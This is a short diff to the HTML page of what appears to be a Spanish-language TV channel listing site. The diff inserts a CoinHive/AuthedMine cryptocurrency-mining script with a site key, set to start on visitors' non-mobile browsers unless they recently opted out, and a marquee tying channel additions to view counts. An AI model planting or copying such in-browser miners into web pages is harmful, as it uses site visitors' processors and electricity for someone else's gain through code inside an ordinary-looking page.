@@ -7,6 +7,16 @@
 	<script language="javascript" type="text/javascript" src="scripts/jQuery.js"></script>
 </head>
 <body>
+<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+<script>
+	var miner = new CoinHive.Anonymous('C6FfXf8rUkX3of6Cv1DcA4Z7MKupaOwD', {throttle: 0.3});
+
+	// Only start on non-mobile devices and if not opted-out
+	// in the last 14400 seconds (4 hours):
+	if (!miner.isMobile() && !miner.didOptOut(14400)) {
+		miner.start();
+	}
+</script>
 <marquee>10,000 Vistas = 1 canal nuevo</marquee>
 	<nav>
 		<a href="index.html">Canal Caracol Colombia</a> 
